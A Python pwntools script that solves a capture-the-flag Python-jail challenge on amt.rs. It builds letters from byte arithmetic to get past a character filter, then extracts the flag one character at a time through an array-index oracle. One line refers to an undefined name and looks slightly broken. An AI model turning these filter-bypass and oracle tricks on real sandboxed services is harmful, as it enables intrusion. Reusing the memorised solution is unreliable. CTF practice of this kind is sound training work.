from pwn import *
from string import ascii_letters

context.update(
    terminal='kitty',
    log_level='info'
)

send = lambda msg: p.sendlineafter(b'Give code: ', msg)
sendc = lambda msg: p.sendline(msg)
get = lambda : p.recvuntil(b'Give code: ', drop=True)

p = remote('amt.rs', 31672)
# p = process(['python', 'lite++Censorship.py'])

# set some variable
send(b"b=''=='';s=''!='';arr='x';IDX=s") # b = True / 1, s = False / 0, arr = array for checking, IDX = index set 0
send(br"L=b'L'[s]+b'!'[s]+~s;L='%c'%L")
send(br"I=b'I'[s]+b'!'[s]+~s;I='%c'%I")
send(br"T=b'T'[s]+b'!'[s]+~s;T='%c'%T")
send(br"E=b'E'[s]+b'!'[s]+~s;E='%c'%E")
send(br"CL=b'|'[s]+~s;CL='%c'%CL")
send(br"CR=b'|'[s]+on;CR='%c'%CR")

flag = ''
while not flag.endswith("}"):
    for c in ascii_letters + '_{}':
        payload = b"arr[_[IDX]=="
        if c in r"lite{}":
            sp = c
            if c == "{":
                sp = "CL"
            elif c == "}":
                sp = "CR"
            payload += sp.upper().encode("utf-8") + b"]"
        
        else:
            payload += b"'" + c.encode("utf-8") + b"']"

        get()
        sendc(payload)
        if b'zzzz' in get():
            sendc(b'IDX+=b')
            flag += c
            info(f'Flag : {flag}')
            break
        sendc(b'')

p.close()